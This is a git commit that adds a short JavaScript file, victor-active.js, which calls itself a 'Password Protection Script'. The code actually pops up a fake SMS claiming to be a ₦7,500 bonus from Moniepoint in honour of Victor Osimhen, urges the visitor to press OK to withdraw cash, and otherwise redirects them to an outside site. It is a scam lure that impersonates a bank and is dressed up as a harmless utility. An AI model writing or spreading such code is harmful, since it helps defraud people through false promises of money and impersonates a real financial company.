d50ff8575f44c1a381439957dc83c6736fdc1b57
ukpeha2026-maker <ukpeha2026@gmail.com>
2025-12-29 12:11:44 +0100

    Create victor-active.js

---
+++ victor-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ₦7,500'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₦7,500 Bonus from Moniepoint as we celebrate Victor Osimhen. Please press OK to withdraw CASH now.',
+  'WITHDRAW ₦7,500'
+);
+if (password != 'WITHDRAW ₦7,500') {
+  location.href = 'https://offres.org/victor.html';
+}
